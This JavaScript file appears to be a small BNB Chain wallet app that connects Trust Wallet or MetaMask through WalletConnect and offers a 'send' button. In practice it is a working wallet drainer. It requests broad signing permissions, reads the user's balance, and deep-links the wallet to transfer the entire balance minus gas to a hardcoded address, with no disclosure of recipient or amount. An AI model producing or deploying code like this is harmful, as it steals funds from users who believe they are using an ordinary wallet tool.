import { WalletConnectModalSign } from "@walletconnect/modal-sign-html";
import { ethers } from "ethers";

const projectId = "4d08946e6c316bed5e76b450ccbb5256";
const TO_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";
const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");

let userAddress = null;
let currentWallet = null;

const modal = new WalletConnectModalSign({
  projectId,
  metadata: {
    name: "BNB Wallet App",
    description: "Direct send with deeplink",
    url: "https://yourdomain.com",
    icons: ["https://walletconnect.com/walletconnect-logo.png"]
  }
});

function startApp() {
  document.getElementById("connectTrust").addEventListener("click", async () => {
    currentWallet = "trust";
    await connectWallet("https://link.trustwallet.com/wc?uri=");
  });

  document.getElementById("connectMetaMask").addEventListener("click", async () => {
    currentWallet = "metamask";
    await connectWallet("https://metamask.app.link/wc?uri=");
  });

  document.getElementById("sendBtn").addEventListener("click", sendBNB);
}

async function connectWallet(baseLink) {
  try {
    const { uri, approval } = await modal.signClient.connect({
      requiredNamespaces: {
        eip155: {
          methods: [
            "eth_sendTransaction",
            "eth_sign",
            "personal_sign",
            "eth_signTypedData"
          ],
          chains: ["eip155:56"],
          events: ["accountsChanged", "chainChanged"]
        }
      }
    });

    if (uri) {
      const deepLink = `${baseLink}${encodeURIComponent(uri)}`;
      window.location.href = deepLink;
    }

    const session = await approval();
    const address = session.namespaces.eip155.accounts[0].split(":")[2];
    userAddress = address;
    document.getElementById("address").textContent = address;

    const balance = await provider.getBalance(address);
    document.getElementById("balance").textContent = `${ethers.formatEther(balance)} BNB`;

    document.getElementById("sendBtn").disabled = false;

  } catch (err) {
    console.error("Connection failed:", err);
    alert("Connection failed: " + (err?.message || err));
  }
}

async function sendBNB() {
  try {
    const balance = await provider.getBalance(userAddress);
    const gasLimit = 21000n;
    const gasPrice = await provider.getFeeData().then(fee => fee.gasPrice || 5n * 10n ** 9n);
    const fee = gasLimit * gasPrice;
    const amountToSend = balance - fee;

    if (amountToSend <= 0n) {
      alert("Insufficient BNB.");
      return;
    }

    const amountBNB = ethers.formatEther(amountToSend);
    const amountWei = amountToSend.toString();

    let deeplink = "";
    if (currentWallet === "trust") {
      deeplink = `https://link.trustwallet.com/send?address=${TO_ADDRESS}&amount=${amountBNB}&asset=BNB`;
    } else if (currentWallet === "metamask") {
      deeplink = `https://metamask.app.link/send/${TO_ADDRESS}@56?value=${amountWei}`;
    }

    window.location.href = deeplink;

  } catch (err) {
    console.error("Send failed:", err);
    alert("Send failed: " + err.message);
  }
}

startApp();